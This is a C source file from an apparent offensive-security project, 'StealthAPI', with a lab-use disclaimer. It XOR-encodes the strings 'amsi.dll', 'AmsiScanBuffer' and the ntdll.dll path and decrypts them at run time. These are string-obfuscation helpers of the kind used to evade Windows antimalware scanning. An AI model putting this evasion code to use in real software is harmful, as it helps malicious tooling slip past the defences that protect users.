............................................................................
. Project: StealthAPI                                                      .
. Build for educational purpose in authorized lab environments only.        .
. Author: Ebere Michhael (Call Simba)                                      .
. Telegram: @lets_sudosu                                                   .
. Make the world a better place.                                           .
............................................................................

#include <windows.h>
#include "../include/strings.h"
#include "debug.h"

#define XOR_KEY 0x5A
#define MAX_STRING_LEN 256

char g_AmsiDll[] = { ('a' ^ XOR_KEY), ('m' ^ XOR_KEY), ('s' ^ XOR_KEY), ('i' ^ XOR_KEY), ('.' ^ XOR_KEY), ('d' ^ XOR_KEY), ('l' ^ XOR_KEY), ('l' ^ XOR_KEY), 0 };
char g_AmsiScanBuffer[] = { ('A' ^ XOR_KEY), ('m' ^ XOR_KEY), ('s' ^ XOR_KEY), ('i' ^ XOR_KEY), ('S' ^ XOR_KEY), ('c' ^ XOR_KEY), ('a' ^ XOR_KEY), ('n' ^ XOR_KEY), ('B' ^ XOR_KEY), ('u' ^ XOR_KEY), ('f' ^ XOR_KEY), ('f' ^ XOR_KEY), ('e' ^ XOR_KEY), ('r' ^ XOR_KEY), 0 };
char g_NtdllPath[] = { ('C' ^ XOR_KEY), (':' ^ XOR_KEY), ('\\' ^ XOR_KEY), ('W' ^ XOR_KEY), ('i' ^ XOR_KEY), ('n' ^ XOR_KEY), ('d' ^ XOR_KEY), ('o' ^ XOR_KEY), ('w' ^ XOR_KEY), ('s' ^ XOR_KEY), ('\\' ^ XOR_KEY), ('S' ^ XOR_KEY), ('y' ^ XOR_KEY), ('s' ^ XOR_KEY), ('t' ^ XOR_KEY), ('e' ^ XOR_KEY), ('m' ^ XOR_KEY), ('3' ^ XOR_KEY), ('2' ^ XOR_KEY), ('\\' ^ XOR_KEY), ('n' ^ XOR_KEY), ('t' ^ XOR_KEY), ('d' ^ XOR_KEY), ('l' ^ XOR_KEY), ('l' ^ XOR_KEY), ('.' ^ XOR_KEY), ('d' ^ XOR_KEY), ('l' ^ XOR_KEY), ('l' ^ XOR_KEY), 0 };

char* JitDecrypt(const char* enc, size_t len, BYTE key) {
    char* decrypted = (char*)malloc(len + 1);
    if (!decrypted) {
        LOG("JitDecrypt: Memory allocation failed\n");
        return NULL;
    }
    for (size_t i = 0; i < len; i++) {
        decrypted[i] = enc[i] ^ key;
    }
    decrypted[len] = '\0';
    LOG("JitDecrypt: Decryption successful\n");
    return decrypted;
}

void DecryptString(char* str) {
    if (!str || IsBadWritePtr(str, 1)) {
        LOG("DecryptString: Invalid string pointer\n");
        return;
    }
    size_t len = strlen(str);
    LOG("DecryptString: Starting decryption\n");
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(str, &mbi, sizeof(mbi))) {
        char buf[LOG_BUFFER_SIZE];
        snprintf(buf, sizeof(buf), "String memory protection: 0x%X\n", mbi.Protect);
        LOG(buf);
        if (!(mbi.Protect & PAGE_READWRITE)) {
            LOG("String is not writable, decrypting to new buffer\n");
            char* decrypted = JitDecrypt(str, len, XOR_KEY);
            if (decrypted) {
                memcpy(str, decrypted, len + 1);
                free(decrypted);
                LOG("DecryptString: Copied decrypted string back\n");
            } else {
                LOG("DecryptString: Decryption failed\n");
            }
        } else {
            for (size_t i = 0; i < len; i++) {
                str[i] ^= XOR_KEY;
            }
            LOG("DecryptString: In-place decryption completed\n");
        }
    } else {
        LOG("DecryptString: VirtualQuery failed\n");
    }
}